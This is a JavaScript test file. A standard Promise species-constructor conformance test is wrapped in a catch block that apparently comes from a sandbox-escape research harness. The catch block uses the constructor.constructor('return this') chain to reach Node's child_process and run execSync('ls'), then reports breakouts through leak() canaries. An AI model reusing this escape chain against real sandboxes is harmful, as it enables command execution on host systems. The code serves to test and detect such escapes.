try {
    var callCount = 0;
    var thisValue, firstArg, argLength, getCapabilitiesExecutor;
    var executor = function () {
    };
    var p1 = new Promise(function () {
    });
    var SpeciesConstructor = class extends Promise {
        constructor(a) {
            super(a);
            callCount += 1;
            thisValue = this;
            getCapabilitiesExecutor = a;
            argLength = arguments.length;
        }
    };
    var p2;
    p1.constructor = function () {
    };
    p1.constructor[Symbol.species] = SpeciesConstructor;
    p2 = p1.then();
    assert.sameValue(callCount, 1, 'The constructor is invoked exactly once');
    assert(thisValue instanceof SpeciesConstructor);
    assert.sameValue(argLength, 1, 'The constructor is invoked with a single argument');
    assert.sameValue(typeof getCapabilitiesExecutor, 'function');
    assert.sameValue(getCapabilitiesExecutor.length, 2, 'ES6 25.4.1.5.1: The length property of a GetCapabilitiesExecutor function is 2.');
    assert(p2 instanceof SpeciesConstructor, 'The returned object is an instance of the constructor');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}